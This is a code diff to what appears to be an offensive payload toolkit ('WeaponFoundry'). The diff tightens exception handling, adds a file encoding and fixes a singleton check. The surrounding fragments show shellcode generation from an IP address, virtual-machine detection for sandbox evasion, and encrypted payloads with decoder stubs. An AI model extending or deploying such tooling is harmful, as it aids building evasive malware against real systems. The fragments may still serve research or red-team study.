@@ -29,6 +29,9 @@ except ImportError:
 
 logger = logging.getLogger(__name__)
 
+# Singleton instance
+_weapon_foundry: "WeaponFoundry | None" = None
+
 
 # =============================================================================
 # CONSTANTS
@@ -450,7 +453,8 @@ class ShellcodeGenerator:
             struct.pack("BBBB", *ip_parts)
             # Simple check to avoid complexity in this demo
             # Real implementation requires a full compact shellcode block
-        except Exception:
+        except (ValueError, struct.error) as e:
+            logger.debug("Shellcode generation failed: %s", e)
             return b""
 
         # Returning a generic "Pop Calc" shellcode for safety/demo if this were a test
@@ -640,7 +644,7 @@ def _vm() -> Any:
         return o not in ["none",""]
     except Exception: pass
     try:
-        with open("/sys/class/dmi/id/product_name") as f:
+        with open("/sys/class/dmi/id/product_name", encoding="utf-8") as f:
             p=f.read().lower()
             for v in ["vmware","virtualbox","qemu","xen","kvm"]:
                 if v in p: return True
@@ -857,8 +861,10 @@ class WeaponFoundry:
             payload_bytes = iv + payload_bytes
             logger.debug("Encryption IV prepended to payload: %s", iv.hex())
 
-        # Generate decoder stub
-        decoder_stub = self._generate_decoder(encryption, key, format)
+        # Generate decoder stub (key is guaranteed to be set if encryption was applied)
+        decoder_stub = ""
+        if key is not None:
+            decoder_stub = self._generate_decoder(encryption, key, format)
 
         return GeneratedPayload(
             payload=payload_bytes,
@@ -1027,7 +1033,7 @@ def get_weapon_foundry() -> WeaponFoundry:
 
     """
     global _weapon_foundry
-    if "_weapon_foundry" not in globals() or _weapon_foundry is None:
+    if _weapon_foundry is None:
         _weapon_foundry = WeaponFoundry()
     return _weapon_foundry
 
